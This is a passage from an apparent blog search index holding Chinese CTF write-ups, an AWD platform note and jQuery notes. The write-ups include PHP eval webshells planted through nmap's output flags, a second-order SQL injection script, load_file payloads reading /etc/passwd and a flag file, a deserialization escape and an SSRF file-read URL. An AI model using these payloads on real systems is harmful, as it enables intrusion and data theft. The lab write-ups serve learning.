PRIMARY KEY  (`aid`), KEY `typeid` (`typeid`)\\r\\n) ENGINE=MyISAM DEFAULT CHARSET=\".$cfg_db_language.\";\n\n\n\n\n\n\n\n\n而$addtable可以被外部控制。最后在102行被执行\n\n\n\n\n\n\n\n","categories":["代码审计"],"tags":["php代码审计"]},{"title":"BUUCTF-WEB 【网鼎杯 2020 朱雀组】Nmap 1","url":"/2021/04/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap%201/","content":"通过nmap -oN -oG 参数 写马if (isset($_POST['host'])):\tif (!defined('WEB_SCANS')) &#123;        \tdie('Web scans disabled');\t&#125;\t$host = $_POST['host'];\tif(stripos($host,'php')!==false)&#123;\t\tdie(\"Hacker...\");\t&#125;\t$host = escapeshellarg($host);\t$host = escapeshellcmd($host);\t$filename = substr(md5(time() . rand(1, 10)), 0, 5);\t$command = \"nmap \". NMAP_ARGS . \" -oX \" . RESULTS_PATH . $filename . \" \" . $host;\t$result_scan = shell_exec($command);\tif (is_null($result_scan)) &#123;\t\tdie('Something went wrong');\t&#125; else &#123;\t\theader('Location: result.php?f=' . $filename);\t&#125;\n\n拿到flag\npayload\n过滤了php 关键字 \n第一种'&lt;?=eval($_GET[a]);?&gt; -oN flag.phtml '第二种'&lt;?=eval($_GET[a]);?&gt; -oG flag.phtml '\n\n?a=system(\"cat /flag\");\n\n两个知识点Nmap 通过 -oG -oN 参数写 shell&gt; nmap 127.0.0.1 -p 0-1 \"&lt;?php eval($_GET['cmd']);?&gt;\" -oN cmd.phpStarting Nmap 7.70 ( https://nmap.org ) at 2021-04-14 16:51 ?D1ú±ê×?ê±??Failed to resolve \"&lt;?php eval($_GET['cmd']);?&gt;\".Failed to resolve \"&lt;?php eval($_GET['cmd']);?&gt;\".Skipping SYN Stealth Scan against xmind.net (127.0.0.1) because Windows does not support scanning your own machine (localhost) this way.Nmap scan report for xmind.net (127.0.0.1)Host is up.PORT  STATE   SERVICE0/tcp unknown unknown1/tcp unknown tcpmuxFailed to resolve \"&lt;?php eval($_GET['cmd']);?&gt;\".Nmap done: 1 IP address (1 host up) scanned in 4.64 secondsC:\\Users\\root\\Desktop&gt; dir 驱动器 C 中的卷是 Win10 卷的序列号是 C037-0A2C C:\\Users\\root\\Desktop 的目录2021/04/14  16:51    &lt;DIR&gt;          .2021/04/14  16:51    &lt;DIR&gt;          ..2021/04/14  16:51               528 cmd.php # 生成了cmd.php 文件               1 个文件            528 字节               2 个目录  7,621,890,048 可用字节\n\n生成的文件会将 &quot;&lt;?php eval($_GET[&#39;cmd&#39;]);?&gt;&quot; 和 扫描的结果 一起写入cmd.php文件中 ，\nnmap 127.0.0.1 -p 0-1 \"&lt;?php eval($_POST['cmd']);?&gt;\" -oG cmd.php\n\n&gt; nmap 127.0.0.1 -p 0-1 \"&lt;?php eval($_POST['cmd']);?&gt;\" -oG cmd.phpStarting Nmap 7.70 ( https://nmap.org ) at 2021-04-14 16:56 ?D1ú±ê×?ê±??Failed to resolve \"&lt;?php eval($_POST['cmd']);?&gt;\".Failed to resolve \"&lt;?php eval($_POST['cmd']);?&gt;\".Skipping SYN Stealth Scan against xmind.net (127.0.0.1) because Windows does not support scanning your own machine (localhost) this way.Nmap scan report for xmind.net (127.0.0.1)Host is up.PORT  STATE   SERVICE0/tcp unknown unknown1/tcp unknown tcpmuxFailed to resolve \"&lt;?php eval($_POST['cmd']);?&gt;\".Nmap done: 1 IP address (1 host up) scanned in 4.59 secondsC:\\Users\\root\\Desktop&gt; cat cmd.php# Nmap 7.70 scan initiated Wed Apr 14 16:56:04 2021 as: F:\\Tools\\WEB\\PentestBox\\bin\\Nmap\\nmap.exe -p 0-1 -oG cmd.php 127.0.0.1 &lt;?php eval($_POST['cmd']);?&gt;Host: 127.0.0.1 (xmind.net)     Status: UpHost: 127.0.0.1 (xmind.net)     Ports: 0/unknown/tcp/////, 1/unknown/tcp//tcpmux///# Nmap done at Wed Apr 14 16:56:08 2021 -- 1 IP address (1 host up) scanned in 4.59 seconds\n\n顺便说一下，nmap的其他参数 ，比如-oX，也会创建文件，但是符合会被替换成html字符，想这样 &amp;lt;?php eval($_POST[&amp;apos;cmd&amp;apos;]);?&amp;gt;，也就是说只有两种参数能用。\nsescapeshellarg和escapeshellcmd 同时使用照成的问题&lt;?php    $str = \"sys'tem\";    echo escapeshellarg($str);?&gt;//  'sys'\\''tem'\n\n直接将 &#39; 转义成了 &#39;\\&#39;&#39;  \n&lt;?php    $str = \"sys'tem\";    echo escapeshellcmd($str);?&gt;// sys\\'tem\n\n将 &#39; 转义成了 \\&#39; \n最后将两个函数同时使用\n&lt;?php    $str = \"sys'tem\";    $str = escapeshellarg($str);    $str = escapeshellcmd($str);    echo $str;?&gt;// 'sys'\\\\''tem\\'// sys\\tem'\n\n这里的问题就很明显了，两个函数同时使用，会照成某些字符串逃逸。\n&lt;?php    $host = ' &lt;?php eval($_POST[\"cmd\"]);?&gt; -oN cmd.php ';    $host = escapeshellarg($host);    $host = escapeshellcmd($host);    $command = \"nmap \". $host;    echo $command;?&gt;    // nmap ' \\&lt;\\?php eval\\(\\$_POST\\[\\\"cmd\\\"\\]\\)\\;\\?\\&gt; -oN cmd.php '// nmap ' &lt;?php eval($_POST[\"cmd\"]);?&gt; -oN cmd.php '\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","escapeshellarg/escapeshellcmd绕过","参数注入"]},{"title":"BUUCTF-WEB [网鼎杯2018]Unfinish 1","url":"/2021/10/22/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DUnfinish%201/","content":"考点二次注入\n解题脚本import requests,reflag_hex = ''# email=a9%40qq.com&amp;username='%2bsubstr((hex(hex((select * from flag))))from 1 for 10)%2b'&amp;password=1url_reg = \"http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/register.php\"url_login = \"http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/login.php\"for i in range(100):    reg_data = &#123;        'email': 'b%d@qq.com'%(i),        'username': \"'+substr((hex(hex((select * from flag))))from %d for 10)+'\"%(i*10+1),        'password': '1'    &#125;    requests.post(url=url_reg, data=reg_data)    data_login = &#123;        'email': 'b%d@qq.com'%(i),        'password': '1'    &#125;    res = requests.post(url=url_login, data=data_login)    res = re.findall(r'&lt;span class=\"user-name\"&gt;(.*?)&lt;/span&gt;', res.text,re.S)[0].strip()    print(res)    if res == '0':        break    flag_hex +=res    print(flag_hex)\n\n得到的结果再进行两次hex解码就能得到flag。\n","categories":["CTF","BUUCTF"],"tags":["CTF","二次注入"]},{"title":"awd-platform操作笔记","url":"/2021/10/26/awd-platform%E6%93%8D%E4%BD%9C%E7%AC%94%E8%AE%B0/","content":"平台使用笔记根据当前队伍数量copy所有的队伍的比赛文件夹\npython batch.py web_server 5\n\n启动比赛\npython start.py ./ 5\n\n启动check脚本\ndocker attach check_serverpython check.py\n\n比赛参数Flag 提交： 172.17.0.6:80/flag_file.php?token=teamx&amp;flag=xxxx (x为你们的队伍号)\n攻击情况url地址：http://flag服务器IP:端口/result.txt\n得分情况地址：http://flag服务器IP:端口/score.txt\n","categories":["CTF","平台使用笔记"],"tags":["CTF","AWD"]},{"title":"【bugku-WEB】 newphp","url":"/2021/08/08/bugku-newphp/","content":"考点反序列化字符串逃逸\nssrf\n解题思路分析\n&lt;?php// php版本:5.4.44header(\"Content-type: text/html; charset=utf-8\");highlight_file(__FILE__);class evil&#123;    public $hint;    public function __construct($hint)&#123;        $this-&gt;hint = $hint;    &#125;    public function __destruct()&#123;    if($this-&gt;hint===\"hint.php\")            @$this-&gt;hint = base64_encode(file_get_contents($this-&gt;hint));         var_dump($this-&gt;hint);    &#125;    function __wakeup() &#123;         if ($this-&gt;hint != \"╭(●｀∀´●)╯\") &#123;             //There's a hint in ./hint.php            $this-&gt;hint = \"╰(●’◡’●)╮\";         &#125;     &#125;&#125;class User&#123;    public $username;    public $password;    public function __construct($username, $password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;&#125;function write($data)&#123;    global $tmp;    $data = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $data);    $tmp = $data;&#125;function read()&#123;    global $tmp;    $data = $tmp;    $r = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $data);    return $r;&#125;$tmp = \"test\";$username = $_POST['username'];$password = $_POST['password'];$a = serialize(new User($username, $password));if(preg_match('/flag/is',$a))    die(\"NoNoNo!\");unserialize(read(write($a)));\n\n一般看到有unserialize函数，基本上就知道是反序列化类型的题，审计代码的时候首先找到利用的点。\n在evil类的__destruct方法中\npublic function __destruct()&#123;    # $this-&gt;hint 必须为hint.php    if($this-&gt;hint===\"hint.php\")        \t#  读取文件hint.php内容 并且base64编码 重新赋值给$this-&gt;hint            @$this-&gt;hint = base64_encode(file_get_contents($this-&gt;hint));     \t# 输出        var_dump($this-&gt;hint);    &#125;\n\n目的很明确，我们需要通过反序列化evil类来读取hint.php文件查看提示，先在自己搭建环境构造序列化字符串。\n\n得到反序列化字符串\nO:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;\n\n找到可以执行反序列化的地方。\n$tmp = \"test\";$username = $_POST['username'];$password = $_POST['password'];$a = serialize(new User($username, $password));if(preg_match('/flag/is',$a))    die(\"NoNoNo!\");unserialize(read(write($a)));\n\n可以看到这里并不能直接对evil类进行序列化，首先POST接收了两个参数，然后通过两个参数创建了User类，并且进行了序列化，最后通过write和read函数进行替换后才进行反序列化。\n关键点就在这两个函数，这两个函数是造成字符串逃逸的关键因素。\nfunction write($data)&#123;    global $tmp;    $data = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $data);    $tmp = $data;&#125;function read()&#123;    global $tmp;    $data = $tmp;    $r = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $data);    return $r;&#125;# write方法会将 带有*的字符串替换成 \\0\\0\\0 而read方法则相反，会将\\0\\0\\0 替换成*\n\n可以看到\\0\\0\\0会被替换成*，那在反序列化之前使用这两个函数会有什么问题呢？\n首先通过username和password 进行传参，并把刚刚序列化得到的字符串传入进去。\n\n如果直接这样传入进去，后边的O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}就会被丢弃，O:4:&quot;User&quot;:2 。O代表着对象，4代表对象名的字符长度，User就是对象名，2就代表着有两个属性，2个属性就只会读取O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:3:&quot;123&quot;;s:8:&quot;password&quot;;， 后边的就会被丢弃。\n这里我们可以利用字符串替换进行逃逸，我们传入一组 \\00\\00\\00\n没被替换前得到\nO:4:\"User\":2:&#123;s:8:\"username\";s:6:\"\\0\\0\\0\";s:8:\"password\";s:41:\"O:4:\"evil\":1:&#123;s:4:\"hint\";s:8:\"hint.php\";&#125;\";&#125;\n\n经过write和read替换后\nO:4:\"User\":2:&#123;s:8:\"username\";s:6:\"*\";s:8:\"password\";s:41:\"O:4:\"evil\":1:&#123;s:4:\"hint\";s:8:\"hint.php\";&#125;\";&#125;\n\n可以发现变成了s:6:&quot;*&quot;;  这样会意味着 这里要吃掉 *&quot;;s:8 变成 *&quot;;s:8 ，但是后边没有闭合，所以会出错。如果我们想逃逸出O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}&quot;;}，那就必须吃掉 &quot;;s:8:&quot;password&quot;;s:41:&quot;这23个字符，而一组\\0\\0\\0 能吃掉三个，这三个字符由chr(0).&#39;*&#39;.chr(0) 组成的三个，那么就需要8组\\0\\0\\0 ，这样就得到24个，另外再由password加上一个任意字符凑齐24个，将evil的属性个数改为2绕过__wakeup方法检测。\n\npayload\nusername=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;password=a\";O:4:\"evil\":2:&#123;s:4:\"hint\";s:8:\"hint.php\";&#125;\n\n得到base64编码的字符串\nPD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo=解码&lt;?php $hint = &quot;index.cgi&quot;; // You can&apos;t see mefgo\n\n访问index.cgi\nssrf \n获取flag的payload\nhttp://114.67.246.176:17691/index.cgi?name=%20file:///flag\n\n\n","categories":["CTF","Bugku"],"tags":["反序列化","CTF"]},{"title":"BUUCTF-WEB 【网鼎杯 2018】Comment 1","url":"/2021/08/17/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment%201/","content":"考点密码爆破\ngit泄露\n代码审计\n二次注入\n解题过程打开\n一个留言板页面\n\n一个登录页面\n\n自己手工试了下，不存在万能密码绕过。仔细看了下输入框，发现有关键字，直接bp启动，开始爆破zhangwei*** 后三位。\n\n构造3位纯数字作为payload\n\n得到密码 zhangwei666\n\n接下来登录\n\n有个发帖和留言功能，用sqlmap也没检测出注入点。\n接下来用dirsearch扫下目录。\npython3 dirsearch.py -u &quot;http://ccd2d540-8775-4d4a-a19c-70165c4879f1.node4.buuoj.cn:81/&quot; -x 404,429 -s 1\n\n\n存在.git泄露\n使用GitHacker对git文件进行恢复（ubuntu下）\ngithacker --url http://ccd2d540-8775-4d4a-a19c-70165c4879f1.node4.buuoj.cn:81/.git --folder res --threads 1\n\n得到一个write_do.php 的文件\n进目录中查找更改历史\ngit log --reflog\n\n\n只显示这一个，看了别的师傅wp，这里会出来3个历史更改，然后用 git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c 命令，就可以得到完整的代码。\n可能是工具或者环境的问题，这里直接给代码。\n&lt;?phpinclude \"mysql.php\";session_start();# if($_SESSION['login'] != 'yes')&#123;    header(\"Location: ./login.php\");    die();&#125;if(isset($_GET['do']))&#123;\tswitch ($_GET['do'])\t&#123;\tcase 'write':\t\t$category = addslashes($_POST['category']);\t\t$title = addslashes($_POST['title']);\t\t$content = addslashes($_POST['content']);\t\t# 将 category title content 插入 board 表中\t\t$sql = \"insert into board\t\t\t\tset category = '$category',\t\t\t\t\ttitle = '$title',\t\t\t\t\tcontent = '$content'\";\t\t# 执行sql\t\t$result = mysql_query($sql);\t\theader(\"Location: ./index.php\");\t\tbreak;\tcase 'comment':\t\t\t\t$bo_id = addslashes($_POST['bo_id']);\t\t# 根据 bo_id 查询 category 字段值\t\t$sql = \"select category from board where id='$bo_id'\";\t\t# 执行sql\t\t$result = mysql_query($sql);\t\t$num = mysql_num_rows($result);\t\t# 大于0 代表有结果集\t\tif($num&gt;0)&#123;\t\t\t# 获取 category 字段值\t\t\t$category = mysql_fetch_array($result)['category'];\t\t\t# 获取提交内容\t\t\t$content = addslashes($_POST['content']);\t\t\t# 将 category 和 content 、bo_id 放入数据库中\t\t\t# sql语句中的 $category 变量是从数据库中取出，而 $category 的值 最开始由\t\t\t  \t\t\t  #\t$_POST['category']\t\t\t# 经过 addslashes 对 单双引号 反斜线 进行转义（给' 转义成 \\',\\\",\\\\）， 但是到数据库中 这些\\\t\t\t# 会被丢弃，所以，这里存在二次注入\t\t\t$sql = \"insert into comment\t\t\t\t\tset category = '$category',\t\t\t\t\t\tcontent = '$content',\t\t\t\t\t\tbo_id = '$bo_id'\";\t\t\t$result = mysql_query($sql);\t\t&#125;\t\theader(\"Location: ./comment.php?id=$bo_id\");\t\tbreak;\tdefault:\t\theader(\"Location: ./index.php\");\t&#125;&#125;else&#123;    header(\"Location: ./index.php\");&#125;?&gt;\n\n代码审计这段代码有两个主要的作用，第一个分支write，是将帖子的标题、内容、分类插入到数据库中，第二个分支comment，提交留言，不过，这里在提交留言的时候，会先根据 bo_id 在数据库中进行查询，然后取出分类字段的字段值，然后再将取出的分类字段值和提交的留言以及bo_id插入到 comment 表中。虽说经过了 addslashes 进行转义，但是数据库中并不会存储 \\ ，所以在第二次取出category，再次进行拼接插入的时候，就照成了注入，也是二次注入。\n$category = addslashes($_POST['category']);\t\t$title = addslashes($_POST['title']);\t\t$content = addslashes($_POST['content']);\t\t# 将 category title content 插入 board 表中\t\t$sql = \"insert into board\t\t\t\tset category = '$category',\t\t\t\t\ttitle = '$title',\t\t\t\t\tcontent = '$content'\";\n\n这里并不存在注入。\n# 这里的$category 是从数据中获取# addslashes($_POST['category']); 拿到 ' \" / 会转义成 \\' \\\" \\\\ # 但是这样的 \\' 存储在数据库中 \\会被丢弃$category = mysql_fetch_array($result)['category'];\t\t\t# 获取提交内容\t\t\t$content = addslashes($_POST['content']);\t\t\t\t\t\t$sql = \"insert into comment\t\t\t\t\tset category = '$category',\t\t\t\t\t\tcontent = '$content',\t\t\t\t\t\tbo_id = '$bo_id'\";\n\n二次注入构造payload aa&#39;,content=database(),/*\n先在index.php\nPOST\ntitle=111&amp;category=aa&apos;,content=database(),/*&amp;content=111\n\ntitle=111&amp;category=aa%27%2Ccontent%3Ddatabase%28%29%2C%2F*&amp;content=111\n\n 插入的数据\ninsert into board set category = 'aa',content=database(),/*', title = '111',content = '111';\n\n然后在comment.php \nPOST\ncontent=*/#&amp;bo_id=2\n\ncontent=*%2F%23&amp;bo_id=2\n\n插入的数据\ninsert into comment set category ='aa',content=database(),/*', content = '*/#',bo_id = '2';\n\n真正在数据库中执行的语句为\ninsert into comment set category = &apos;aa&apos;,content=database(),\n\n回显 数据库名\n\n先用下面payload尝试读取/etc/passwd\nindex.php\ntitle=111&amp;category=aa&apos;,content=(select load_file(&apos;/etc/passwd&apos;)),/*&amp;content=111\n\ncomment.php \ncontent=*/#&amp;bo_id=2\n\n回显\n\n按照别的师傅wp指示\n读取 /home/www/.bash_histroy  \n构造payload\nindex.php\ntitle=111&amp;category=aa&apos;,content=(select load_file(&apos;/home/www/.bash_history&apos;)),/*&amp;content=111\n\n\n再次读取 .DS_store\ntitle=111&amp;category=aa&apos;,content=(select load_file(&apos;/tmp/html/.DS_Store&apos;)),/*&amp;content=111\n\n\n用hex函数继续读取\ntitle=111&amp;category=aa&apos;,content=(select hex(load_file(&apos;/tmp/html/.DS_Store&apos;))),/*&amp;content=111\n\n\n解码\n\n可以从字符串中看到一个带有flag字样的文件名，这个文件名不在/home/www中，在/var/www/html中，\n接下来继续读取\ntitle=111&amp;category=aa&apos;,content=(select hex(load_file(&apos;/var/www/html/flag_8946e1ff1ee3e40f.php&apos;))),/*&amp;content=111\n\n\n得到，解码，拿到flag。\n\n总结这道题两个考点，又学到了新知识，第一个是git源码泄露，原本一直用的是githack，但是这个工具只能下载文件，不能查看历史版本，通过大佬的wp，又了解到一个githacker的工具，中途花了不少时间去安装这个工具，还是踩了些坑，这个工具要比githack强大些。第二个知识就是二次注入，二次注入做了很多次，每次花样都不一样，不看wp肯定做不起，不过又了解到了一种姿势，就此记录下来，原理都是一样。\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","密码爆破","二次注入","文件泄露"]},{"title":"【bugku-WEB】 noteasytrick wp","url":"/2022/08/26/bugku-noteasytrick%20wp/","content":"\n天气太热了，学不进去，做做ctf题打发下时间~_~\n\n考点原生类反序列化\n构造不同文件内容相同文件hash值（fastcoll工具）\n解题思路题给出的源码\n &lt;?phperror_reporting(0);ini_set(\"display_errors\",\"Off\");class Jesen &#123;    public $filename;    public $content;    public $me;    function __wakeup()&#123;        $this-&gt;me = new Ctf();    &#125;    function __destruct() &#123;        $this-&gt;me-&gt;open($this-&gt;filename,$this-&gt;content);    &#125;&#125;class Ctf &#123;    function __toString() &#123;        return \"die\";    &#125;    function open($filename, $content)&#123;        if(!file_get_contents(\"./sandbox/lock.lock\"))&#123;            echo file_get_contents(substr($_POST['b'],0,30));            die();        &#125;else&#123;            file_put_contents(\"./sandbox/\".md5($filename.time()),$content);            die(\"or you can guess the final filename?\");         &#125;            &#125;&#125;if(!isset($_POST['a']))&#123;    highlight_file(__FILE__);    die();&#125;else&#123;    if(($_POST['b'] != $_POST['a']) &amp;&amp; (md5($_POST['b']) === md5($_POST['a'])))&#123;        unserialize($_POST['c']);    &#125;&#125;\n\n解题思路\n首先需要通过序列化原生类ZipArchive删除/sandbox/lock.lock文件，这里需要注意的是，不能够直接去序列化ZipArchive类，如果直接对该序列化，序列化中文件的路径值会为空，需要通过题目给出的Jesen类，通过控制$this-&gt;me变量赋值为实例化的ZipArchive，$j1-&gt;filename要赋值为./sandbox/lock.lock，$j1-&gt;content赋值为ZipArchive::OVERWRITE。然后再对Jesen类进行序列化，再将序列化的值进行提交，这里的条件if(($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;])))先用数组进行绕过。这样就会把lock.lock文件删除掉。\n经过上面的操作后，我们就可以绕过if(!file_get_contents(&quot;./sandbox/lock.lock&quot;))这个条件，\n但是读取文件file_get_contents(substr($_POST[&#39;b&#39;],0,30))这里用到了$_POST[&#39;b&#39;]接收参数值，这样一来，我们就不能用数组来绕过($_POST[&#39;b&#39;] != $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) === md5($_POST[&#39;a&#39;]))这个条件，因为我们需要拿到$_POST[&#39;b&#39;]值。\n但是我们可以用fastcoll工具来生成两个相同hash，内容不一致的文件。\n因为通过substr($_POST[&#39;b&#39;],0,30)只读取了前30位字符串作为参数来执行，可以通过构造./../../../../../../../../flag30位作为文件的前缀，使用fastcoll进行hash碰撞。\n最后只需要将两个文件的内容读取出来，然后再提交，就能读取到flag。\n但是需要注意的一点就是，如果通过file_get_contents读取出来，对其进行url编码后，然后通过post提交上去，是不行的，经过在本地测试，对两个文件读取出来进行url编码在进行md5加密后得到的值是不一致的。所以在解题过程中我使用file_get_contents直接将文件内容读取出来，然后通过php来提交这个请求，就拿到了flag。\n解题过程指定文件前缀通过fastcoll构造hash一致内容不一致的文件。\nreadflag.txt\n./../../../../../../../../flag\n\nfastcoll_v1.0.0.5.exe F:\\Tools\\hash碰撞\\readflag.txt\n\n\n\n\n\n\n\n\n通过原生ZipArchive类，删除/sandbox/lock.lock文件\n$j1 = new Jesen();$j1-&gt;me = new ZipArchive();$j1-&gt;filename = \"./sandbox/lock.lock\";$j1-&gt;content = ZipArchive::OVERWRITE;var_dump(serialize($j1));\n\na[]=aaaa&amp;b[]=bbbb&amp;c=O:5:\"Jesen\":4:&#123;s:8:\"filename\";s:19:\"./sandbox/lock.lock\";s:7:\"content\";i:8;s:2:\"me\";O:10:\"ZipArchive\":5:&#123;s:6:\"status\";i:0;s:9:\"statusSys\";i:0;s:8:\"numFiles\";i:0;s:8:\"filename\";s:0:\"\";s:7:\"comment\";s:0:\"\";&#125;&#125;\n\n读取flag\n&lt;?php$postdata = http_build_query(    array(        'a' =&gt; file_get_contents(\"readflag_msg1.txt\"), // hash碰撞出来的文件        'b' =&gt; file_get_contents(\"readflag_msg2.txt\"),        'c' =&gt; \"O:5:\\\"Jesen\\\":3:&#123;s:8:\\\"filename\\\";s:0:\\\"\\\";s:7:\\\"content\\\";s:0:\\\"\\\";s:2:\\\"me\\\";N;&#125;\"    ));$opts = array('http' =&gt;    array(        'method' =&gt; 'POST',        'header' =&gt; 'Content-type: application/x-www-form-urlencoded',        'content' =&gt; $postdata    ));$context = stream_context_create($opts);$result = file_get_contents('http://114.67.175.224:12225/', false, $context);echo $result;?&gt;\n\n\n\n\n\n\n\n\n","categories":["CTF","Bugku"],"tags":["反序列化","CTF"]},{"title":"jQuery学习笔记","url":"/2020/08/31/jQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"jQuery基础jQuery入口函数使用jQuery的三个步骤\n引入jQuery文件\n入口函数\n功能实现\n\njQuery的入口函数// 第一种写法$(document).ready(function()&#123;\t// code&#125;)// 第二种写法jQuery(document).ready(function()&#123;\t// code&#125;)// 第三种写法 开发中推荐使用$(function)&#123;\t// code&#125;// 第四种写法jQuery(function()&#123;\t// code&#125;)\n\n两种解决jQuery冲突问题\n释放$的使用权\njQuery.noConflict()\n\n注意点：释放操作必须在编写其他jQuery代码之前编写，释放之后就不能再使用$,改为使用jQuery\n\n自定义一个访问符号\nvar jq = jQuery.noConflict()jq(function()&#123;\t// code&#125;)\n\n\n\njQuery核心函数\n$();\n\n调用jQuery的核心函数\n\n参数\n\n接收一个字符串\n接收一个字符串选择器\n返回一个jQuery对象，对象中报错了找到的DOM元素\n\n\n接收一个字符串代码片段\n返回一个jQuery对象，对象中保存了创建的DOM元素\n\n\n\n\n接收一个DOM元素\n会被包装成一个jQuery对象返回给我们    \n\n\n\n\n\n\n\n什么是jQuery对象\njQuery对象是一个伪数组\n伪数组有0到length-1的属性，并且有length属性\n\n\n\n静态方法和实例方法\n怎么给类添加一个静态方法？\n\n直接添加给类就是静态方法\n\n// 定义一个类function Person()&#123;&#125;// 添加静态方法Person.showName = function()&#123;    alert(\"showName\");&#125;\n\n\n\n\n\n\n怎样调用静态方法？\n\n静态方法通过类名调用\n\nPerson.showName();\n\n\n\n\n\n\n怎么给类添加实例方法？\n\n添加到类的原型当中\n\nPerson.prototype.showAge = function()&#123;    alert('showAge');&#125;\n\n\n\n\n\n\n怎样调用实例方法？\n\n实例方法通过类的实例调用\n\nvar p = new Person();p.showAge();\n\n\n\njQueryAPI遍历\n\n原生遍历数组的方法\n\nforEach()\n\n第一个参数：遍历到的元素\n第二个参数：当前遍历到的索引\n注意点\n原生forEach方法只能遍历数组，不能遍历伪数组// 定义数组var arr = [1, 3, 5, 7, 9];// 遍历数组arr.forEach(function(value, index)&#123;      \tconsole.log(index, value);      &#125;)\n\n\n\n\n\nmap()方法\n\n第一个参数：当前遍历到的元素\n第二个参数：当前遍历到的索引\n第三个参数：当前遍历的数组\n注意点\n和原生的forEach一样,不能遍历的伪数组\n\n\n\nvar arr = [1, 3, 5, 7, 9];arr.map(function(value, index, array)&#123;\t  console.log(index, value, array);&#125;)\n\n\n\njQuery遍历数组的方法\n\neach()  \n\n第一个参数：当前遍历到的索引\n\n第二个参数：遍历到的元素\n\n注意点\n\njQuery的each方法是可以遍历伪数组的// 真数组var arr = [1, 3, 5, 7, 9];var obj = &#123;0:1, 1:3, 2:5, 3:7, 4:9, length:5&#125;;// 伪数组$.each(arr, function(index, value)&#123;\t console.log(index, value);$.each(obj, function(index, value)&#123;\tconsole.log(index, value);&#125;);\n\n\n\nmap()\n\n第一个参数：要遍历的数组\n第二个参数：要遍历一个原生之后执行的回调函数\n回调函数的参数：\n第一个参数：要遍历到的元素\n第二个参数：遍历到的索引\n\n\n\n\n注意点\njQuery种each静态方法一样，map静态方法也可以遍历var arr = [1, 3, 5, 7, 9];var obj = &#123;0:1, 1:3, 2:5, 3:7, 4:9, length:5&#125;;$.map(arr, function(value, index)&#123;\t console.log(index, value);\n\n\n\n\n\n区别\njQuery中的each静态方法和map静态方法的区别：each静态方法默认的返回值就是，遍历谁就返回谁map静态方法则是默认返回值是一个空数组\neach静态方法不支持再回调函数中对遍历的数组进行处理map静态方法可以再回调函数中通过return对遍历的数组进行处理，然后生成一个新数组返回\n\n\n\n\n其他方法\n\n$.trim()\n\n作用：去除字符串两端空格\n参数：需要去除空格的字符串\n返回值：去除空格之后的字符串\n\n\n\n\n\n\n$.isWindow()\n\n作用：判断传入的对象是否是window对象\n返回值：true/false\n\n\n$.isArray();\n\n作用：判断传入的对象是否是真数组\n返回值：true/false\n\n\n$.isFunction();\n\n作用：判断传入的对象是否是一个函数\n返回值：true/false\n注意点：\njQuery框架本质上是一个函数\n\n\n\n(function( window, undefined ) &#123; &#125;)( window );\n\n选择器 jQuery内容选择器\n &lt;div&gt;&lt;/div&gt;&lt;div&gt;我是div&lt;/div&gt;&lt;div&gt;我是div123我是div123&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;\n\n\n:empty\n\n作用：找到既没有文本内容也没有子元素的指定元素\nvar $div = $('div:empty');\n\n\n\n\n\n\n:parent\n\n作用：找到文本内容或有子元素的指定元素\nvar $div = $('div:parent');\n\n\n\n:contains(text)\n\n作用：找到包含指定文本内容的指定元素\nvar $div = $('div:contains(div)');\n\n\n\n:has(selector)\n\n作用：找到包含指定子元素的指定元素\nvar $div = $('div:has(\"span\")');\n\n\n\n\n\n属性和属性节点\n原生操作属性节点的方法\n\nsetAttribute()\n作用：设置属性节点  DOM元素.setAttribute(&#39;属性名称&#39;, &#39;值&#39;);\n\n\ngetAttribute()\n作用：获取属性节点  DOM元素.getAttribute(&#39;属性名称&#39;);\n\n\n\n\njQuery操作属性节点的方法\n\nattr(name|pro|key, val|fn)\n\n作用：获取或者设置属性节点的值\n\n第二个参数可选\n\n传递一个参数，代表获取属性节点值\n\n传递两个参数，代表设置属性节点值\nvar res = $(&quot;.sp1&quot;).attr(&#39;name&#39;, &#39;span&#39;);\n\n\n\n\n\nremoveAttr(name)\n\n作用：删除属性节点\n\n注意点\n\n会删除所有找到元素指定的属性节点\n$(&#39;.sp2&#39;).removeAttr(&#39;name class&#39;);\n\n\n\n\n\nprop()\n\n作用和attr方法一致\n  console.log($('input').attr('checked')); //选中返回 checked 未选中返回undefined\n\n\n\nremoveProp()\n\n作用和removeAttr一致\n  console.log($('input').prop('checked')); // 选中返回 true 未选中返回false\n\n\n\n\n\n\n\n注意点\nprop方法不仅能够操作属性，还能操作属性节点\nattr和prop既然作用一致，那开发中究竟用谁?\n官方推荐在操作属性节点时,具有 true 和 false 两个属性的属性节点，如 checked, selected 或者 disabled 使用prop()，其他的使用 attr()操作类\njQuery操作类方法\n\naddClass(class|fn)\n\n作用：添加一个类；如果要添加多个，多个类名之间用空格隔开即可\n  $(&#39;div&#39;).addClass(&#39;class1 